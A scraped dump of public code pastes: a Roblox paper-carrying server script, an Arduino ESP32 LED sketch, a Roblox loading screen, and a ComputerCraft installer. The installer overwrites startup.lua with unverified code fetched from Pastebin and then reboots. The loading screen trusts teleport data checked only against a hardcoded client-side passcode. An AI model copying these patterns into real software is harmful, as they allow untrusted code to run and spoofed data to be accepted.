    player:GetAttributeChangedSignal(""CarryCapacity""):Connect(function() clearCachesOnUpgrade(player, ""CarryCapacity"") end)
    player:GetAttributeChangedSignal(""CarryBalance""):Connect(function() clearCachesOnUpgrade(player, ""CarryBalance"") end)

    task.spawn(connectSellTriggersForPlayer, player) -- Spawns a new task to set up the player's selling triggers.

    player.CharacterAdded:Connect(function(character) -- Connects to the CharacterAdded event (triggered when a player's character spawns or respawns).
        forceDropAll(player) -- Forces dropping any leftover papers from a previous life (for a clean start).
        local humanoid = character:WaitForChild(""Humanoid"")
        humanoid.Died:Connect(function() -- Connects to the Humanoid.Died event (triggered when the player's character dies).
            forceDropAll(player) -- Ensures papers are dropped upon death.
        end)
    end)
end

-- This function cleans up data when a player leaves the game.
-- It ensures all associated data and connections are cleared to prevent memory leaks and unnecessary processing.
local function onPlayerRemoving(player)
    forceDropAll(player) -- Forces dropping all carried papers before the player leaves.

    -- Clear all data associated with the player.
    serverCarriedPapers[player] = nil
    originalPlayerSpeeds[player] = nil
    sellCooldowns[player] = nil
    paperCapacityCache[player] = nil
    speedReductionCache[player] = nil

    -- Disconnects and cleans up selling trigger connections.
    if promptConnections[player] then
        if promptConnections[player].Prompt then promptConnections[player].Prompt:Disconnect() end
        if promptConnections[player].Touch then promptConnections[player].Touch:Disconnect() end
        promptConnections[player] = nil
    end
end

-- Connect the functions to game events.
-- Binds the `onPlayerAdded` and `onPlayerRemoving` functions to the respective player events.
Players.PlayerAdded:Connect(onPlayerAdded)
Players.PlayerRemoving:Connect(onPlayerRemoving)

-- Set up for any players who are already in the game when the script runs.
-- This loop ensures that `onPlayerAdded` is called for any players already present when the script is initialized,
-- which is important for hot reloads or if the script starts late.
for _, player in ipairs(Players:GetPlayers()) do
    task.spawn(onPlayerAdded, player) -- Spawns a new task to set up each existing player.
end"
6JTrtpVG,LED Control rev_01,pleasedontcode,Arduino,Saturday 19th of July 2025 10:21:55 AM CDT,"/********* Pleasedontcode.com **********

	Pleasedontcode thanks you for automatic code generation! Enjoy your code!

	- Terms and Conditions:
	You have a non-exclusive, revocable, worldwide, royalty-free license
	for personal and commercial use. Attribution is optional; modifications
	are allowed, but you're responsible for code maintenance. We're not
	liable for any loss or damage. For full terms,
	please visit pleasedontcode.com/termsandconditions.

	- Project: LED Control
	- Source Code NOT compiled for: Arduino Nano ESP32
	- Source Code created on: 2025-07-19 15:21:29

********* Pleasedontcode.com **********/

/****** SYSTEM REQUIREMENTS *****/
/****** SYSTEM REQUIREMENT 1 *****/
	/* turn on led on esp 32 itelf after i press button */
	/* on remotexy */
/****** END SYSTEM REQUIREMENTS *****/

/* START CODE */

/****** DEFINITION OF LIBRARIES *****/
// You need to include the RemoteXY library for the control interface
#include <RemoteXY.h>

/****** FUNCTION PROTOTYPES *****/
void setup(void);
void loop(void);

/* USER CODE START */

uint8_t RemoteXY_CONF[] =   // 29 bytes
  { 255,1,0,0,0,22,0,19,0,0,0,0,31,1,106,200,1,1,1,0,
  1,47,67,24,24,0,2,31,0 };

// this structure defines all the variables and events of your control interface 
struct {

    // input variables
  uint8_t button_01; // =1 if button pressed, else =0

    // other variable
  uint8_t connect_flag;  // =1 if wire connected, else =0

} RemoteXY;   

// Define the built-in LED pin for ESP32 (usually GPIO 2)
const int ledPin = 2;

/* USER CODE END */

void setup(void)
{
  // put your setup code here, to run once:
  RemoteXY_Init(); // Initialize RemoteXY interface
  pinMode(ledPin, OUTPUT); // Initialize the LED pin as output
}

void loop(void)
{
  // put your main code here, to run repeatedly:
  RemoteXY_Handler(); // Handle RemoteXY communication

  // Turn on LED if button is pressed
  if (RemoteXY.button_01 == 1) {
    digitalWrite(ledPin, HIGH); // Turn on the built-in LED
  } else {
    digitalWrite(ledPin, LOW); // Turn off the built-in LED
  }
}

/* END CODE */"
SKE1zVJ7,RRLoading,Stxrlight,Lua,Saturday 19th of July 2025 09:41:39 AM CDT,"-- For when teleporting to game
local text1, text2 = 'NOW', 'LOADING'
local forceContinue = false
local teleportGui
game:GetService('TeleportService').LocalPlayerArrivedFromTeleport:connect(function(gui, data)
	local player = game:GetService('Players').LocalPlayer
	local userId = player.UserId
	teleportGui = gui
	if not data or type(data) ~= 'table' or data.passcode ~= 'PBB_RTD_1214CD-14dW4289' then return end
	if data.userId ~= userId then wait(); player:Kick('Teleport error: player ID mismatch') end
	forceContinue = true
	if data.text1 and data.text2 then
		text1 = data.text1
		text2 = data.text2
	end
end)

local player = game:GetService('Players').LocalPlayer
local userId = player.UserId
local gui = Instance.new('ScreenGui')

local Timing = {
	easeOutCubic = function(d)
		return function(t)
			t = t / d - 1
			return t^3 + 1
		end
	end
}
local stepped = game:GetService('RunService').RenderStepped
function Tween(duration, timing, fn)
	if type(timing) == 'string' then
		timing = Timing[timing](duration)
	end
	local st = tick()
	fn(0)
	while true do
		stepped:wait()
		local et = tick()-st
		if et >= duration then
			fn(1)
			return
		end
		local a = et/duration
		if timing then
			a = timing(et)
		end
		if fn(a) == false then return end
	end
end
function create(instanceType)
	return function(data)
		local obj = Instance.new(instanceType)
		for k, v in pairs(data) do
			local s, e = pcall(function()
				if type(k) == 'number' then
					v.Parent = obj
				elseif type(v) == 'function' then
					obj[k]:connect(v)
				else
					obj[k] = v
				end
			end)
			if not s then
				error('Create: could not set property '..k..' of '..instanceType..' ('..e..')', 2)
			end
		end
		return obj
	end
end


--
local PlayerGui = player:WaitForChild('PlayerGui')
gui.Name = 'LoadingGui'
gui.Parent = PlayerGui

local container = create 'Frame' {
	BackgroundColor3 = Color3.new(0, 0, 0),
	BorderSizePixel = 0,
	Size = UDim2.new(1.0, 0, 1.0, 36),
	Position = UDim2.new(0.0, 0, 0.0, -36),
	Parent = gui
}
local top = create 'Frame' {
	BackgroundTransparency = 1.0,
	Size = UDim2.new(1.0, 0, 0.5, 0),-- 36),
	Position = UDim2.new(0.0, 0, 0.0, 0),-- -36),
	ClipsDescendants = true,
	Parent = container,
}
local bottom = create 'Frame' {
	BackgroundTransparency = 1.0,
	Size = UDim2.new(1.0, 0, 0.5, 0),
	Position = UDim2.new(0.0, 0, 0.5, 0),
	ClipsDescendants = true,
	Parent = container,

	create 'Frame' {
		Name = 'div',
		BackgroundTransparency = 1.0,
		Size = UDim2.new(1.0, 0, 2.0, 0),-- 36),
		Position = UDim2.new(0.0, 0, -1.0, 0),-- -36),
	}
}
function tileBackgroundTexture(frameToFill)
	frameToFill:ClearAllChildren()
	local backgroundTextureSize = Vector2.new(512, 512)
	for i = 0, math.ceil(frameToFill.AbsoluteSize.X/backgroundTextureSize.X) do
		for j = 0, math.ceil(frameToFill.AbsoluteSize.Y/backgroundTextureSize.Y) do
			create 'ImageLabel' {
				BackgroundTransparency = 1,
				Image = 'rbxasset://textures/loading/darkLoadingTexture.png',
				Position = UDim2.new(0, i*backgroundTextureSize.X, 0, j*backgroundTextureSize.Y),
				Size = UDim2.new(0, backgroundTextureSize.X, 0, backgroundTextureSize.Y),
				ZIndex = 2,
				Parent = frameToFill,
			}
		end
	end
end
local sq = create 'Frame' {
	BackgroundTransparency = 1.0,
	SizeConstraint = Enum.SizeConstraint.RelativeYY,
	Size = UDim2.new(1.0, 0, 1.0, 0),
	Parent = container,
}
local function onScreenSizeChanged(prop)
	if prop ~= 'AbsoluteSize' then return end
	tileBackgroundTexture(top)
	tileBackgroundTexture(bottom.div)
	sq.Position = UDim2.new(0.5, -sq.AbsoluteSize.X/2, 0.0, 0)
end

local circle = create 'ImageLabel' {
	BackgroundTransparency = 1.0,
	Image = 'rbxassetid://6138628626',
	ImageColor3 = Color3.new(0, 0, 0),
	Size = UDim2.new(0.0, 1, 0.0, 1),
	Position = UDim2.new(0.1, 0, 0.5, 0),
	ZIndex = 3,
	Parent = sq,
}
local ball = create 'ImageLabel' {
	BackgroundTransparency = 1.0,
	Image = 'rbxassetid://6142797850',-- 288676138
	Size = UDim2.new(0.0, 1, 0.0, 1),
	Position = UDim2.new(0.1, 0, 0.5, 0),
	ZIndex = 4,
	Parent = sq,
}
spawn(function()
	local s = tick()
	while ball.Parent do
		stepped:wait()
		ball.Rotation = (tick()-s)*250
	end
end)
local s = 0.1
local nowcontainer = create 'Frame' {
	BackgroundTransparency = 1.0,
	ClipsDescendants = true,
	Size = UDim2.new(1.0, 0, s, 0),
	Position = UDim2.new(-0.5-s*2.5/2, 0, 0.5-s/2, 0),
	Parent = sq,
}
wait(.1)
local now = create 'TextLabel' {
	BackgroundTransparency = 1.0,
	Size = UDim2.new(1.0, 0, 1.0, 0),
	Position = UDim2.new(1.0, 0, 0.0, 0),
	Text = text1,
	TextXAlignment = Enum.TextXAlignment.Right,
	Font = Enum.Font.SourceSansBold,
	TextScaled = true,
	TextColor3 = Color3.new(.3, .3, .3),
	ZIndex = 5,
	Parent = nowcontainer,
}
local loadingcontainer = create 'Frame' {
	BackgroundTransparency = 1.0,
	ClipsDescendants = true,
	Size = UDim2.new(1.0, 0, s, 0),
	Position = UDim2.new(0.5+s*2.5/2, 0, 0.5-s/2, 0),
	Parent = sq,
}
local loading = create 'TextLabel' {
	BackgroundTransparency = 1.0,
	Size = UDim2.new(1.0, 0, 1.0, 0),
	Position = UDim2.new(-1.0, 0, 0.0, 0),
	Text = text2,
	TextXAlignment = Enum.TextXAlignment.Left,
	Font = Enum.Font.SourceSansBold,
	TextScaled = true,
	TextColor3 = Color3.new(.3, .3, .3),
	ZIndex = 5,
	Parent = loadingcontainer,
}

wait(.1)
local ch = gui.Changed:connect(onScreenSizeChanged)
onScreenSizeChanged('AbsoluteSize')
game:GetService('ReplicatedFirst'):RemoveDefaultLoadingScreen()
wait(.1)
if teleportGui then
	teleportGui:Destroy()
end

local b = s*2.25
delay(.5, function()
	Tween(.7, 'easeOutCubic', function(a)
		ball.Size = UDim2.new(b*a, 0, b*a, 0)
		ball.Position = UDim2.new(0.5-b*a/2, 0, 0.5-b*a/2, 0)
	end)
end)
Tween(1, 'easeOutCubic', function(a)
	top.Position = UDim2.new(0.0, 0, -s/2*a, 0)-- -36)
	bottom.Position = UDim2.new(0.0, 0, 0.5+s/2*a, 0)
	circle.Size = UDim2.new(s*2.5*a, 0, s*2.5*a, 0)
	circle.Position = UDim2.new(0.5-s*2.5*a/2, 0, 0.5-s*2.5*a/2, 0)
end)
Tween(.5, 'easeOutCubic', function(a)
	now.Position = UDim2.new(1-a, 0, -0.01, 0)
	loading.Position = UDim2.new(-1+a, 0, -0.01, 0)
end)


wait(.5)
while true do
	wait(.5)
	if game:IsLoaded() then break end
	wait(.5)
end
game:GetService('StarterGui'):SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

local comTag = script.Parent:WaitForChild('Waiting')

local fader = create 'Frame' {
	BackgroundColor3 = Color3.new(0, 0, 0),
	BorderSizePixel = 0,
	Size = UDim2.new(1.0, 0, 1.0, 0),
	ZIndex = 10,
	Parent = container,
}
Tween(1.6, 'easeOutCubic', function(a)
	local o = 1-a
	top.Position = UDim2.new(0.0, 0, -s/2*o, 0)-- -36)
	bottom.Position = UDim2.new(0.0, 0, 0.5+s/2*o, 0)
	circle.Size = UDim2.new(s*2.5*o, 0, s*2.5*o, 0)
	circle.Position = UDim2.new(0.5-s*2.5*o/2, 0, 0.5-s*2.5*o/2, 0)

	now.Position = UDim2.new(a, 0, -0.01, 0)
	loading.Position = UDim2.new(-a, 0, -0.01, 0)

	ball.ImageColor3 = Color3.new(o, o, o)
	ball.Size = UDim2.new(b+3*a, 0, b+3*a, 0)
	ball.Position = UDim2.new(0.5-b/2-3*a/2, 0, 0.5-b/2-3*a/2, 0)
	fader.BackgroundTransparency = o
end)

ch:disconnect()
if gui then
	comTag.Value = gui
end
if forceContinue then
	comTag.Name = 'ForceContinue'
else
	comTag.Name = 'Ready'
end
script:Destroy()"
EXKqgMcD,2.1I,GochiPC,Lua,Saturday 19th of July 2025 09:26:42 AM CDT,"term.clear()
term.setCursorPos(1,1)
print(""Please wait..."")
sleep(3)
term.clear()
term.setCursorPos(1,1)
print(""Welcome to MineOS 2.1 Installer"")
print(""type start/exit"")
print(""warning if you have other os it will removes startup file"")
local choice = read()

if choice == ""start"" then
  print(""Please wait this will take secs"")
  sleep(1)
  shell.run(""delete startup.lua"")
  shell.run(""pastebin get 1uU92QqU startup.lua"")
  print(""rebooting..."")
  sleep(3)
  os.reboot()
elseif choice == ""exit"" then
  print(""exiting the installer"")
  return
else
  print(""Invalid option"")
end"
